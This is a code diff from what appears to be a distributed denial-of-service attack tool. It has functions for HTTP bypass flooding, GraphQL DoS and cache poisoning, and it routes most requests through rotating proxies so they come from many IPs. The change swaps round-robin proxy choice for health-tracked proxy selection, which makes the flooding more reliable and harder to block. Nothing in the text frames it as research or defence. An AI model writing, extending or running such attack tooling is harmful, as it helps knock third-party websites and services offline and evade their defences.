@@ -1058,11 +1058,11 @@ async function runHTTPBypass(
 
       const useProxy = proxies.length > 0 && Math.random() < 0.95;
       if (useProxy) {
-        const proxy = proxies[proxyIdx++ % proxies.length];
+        const proxy = pickProxy(proxies);
         try {
           const bytes = await fetchViaProxy(fullUrl, proxy, "GET", fetchHdrs);
-          localPkts++; localBytes += bytes;
-        } catch { localPkts++; localBytes += 80; }
+          localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
+        } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
       } else {
         try {
           const ac  = new AbortController();
@@ -2504,7 +2504,7 @@ function httpConnectTunnel(
 // ─────────────────────────────────────────────────────────────────────────
 async function mkTLSSock(
   proxies:      ProxyConfig[],
-  idx:          number,
+  _idx:         number,
   resolvedHost: string,
   hostname:     string,
   targetPort:   number,
@@ -2518,13 +2518,14 @@ async function mkTLSSock(
     ...extraOpts,
   };
   if (proxies.length > 0) {
-    const proxy = proxies[idx % proxies.length];
+    const proxy = pickProxy(proxies);
     try {
       const tunnel = proxy.type === "socks5"
         ? await socks5Connect(proxy, hostname, targetPort)
         : await httpConnectTunnel(proxy, hostname, targetPort);
+      recordProxySuccess(proxy.host, proxy.port);
       return tls.connect({ socket: tunnel, ...opts });
-    } catch { /* proxy failed — use direct */ }
+    } catch { recordProxyFailure(proxy.host, proxy.port); /* proxy failed — use direct */ }
   }
   return tls.connect({ host: resolvedHost, port: targetPort, ...opts });
 }
@@ -3326,11 +3327,11 @@ async function runGraphQLDoS(
 
         // Route through proxy when available (95% of requests)
         if (proxies.length > 0 && Math.random() < 0.95) {
-          const proxy = proxies[proxyIdx++ % proxies.length];
+          const proxy = pickProxy(proxies);
           try {
             const bytes = await fetchViaProxy(url, proxy, "POST", headers, body);
-            localPkts++; localBytes += bytes;
-          } catch { localPkts++; localBytes += 80; }
+            localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
+          } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
           if (Math.random() < 0.05) await new Promise(r => setTimeout(r, 5));
           continue;
         }
@@ -3509,11 +3510,11 @@ async function runCachePoison(
         };
         // Route through proxy (95% when available) — each request from different IP = different cache key
         if (proxies.length > 0 && Math.random() < 0.95) {
-          const proxy = proxies[pIdx++ % proxies.length];
+          const proxy = pickProxy(proxies);
           try {
             const bytes = await fetchViaProxy(url, proxy, "GET", hdrs);
-            localPkts++; localBytes += bytes;
-          } catch { localPkts++; localBytes += 80; }
+            localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port);
+          } catch { localPkts++; localBytes += 80; recordProxyFailure(proxy.host, proxy.port); }
           continue;
         }
         try {
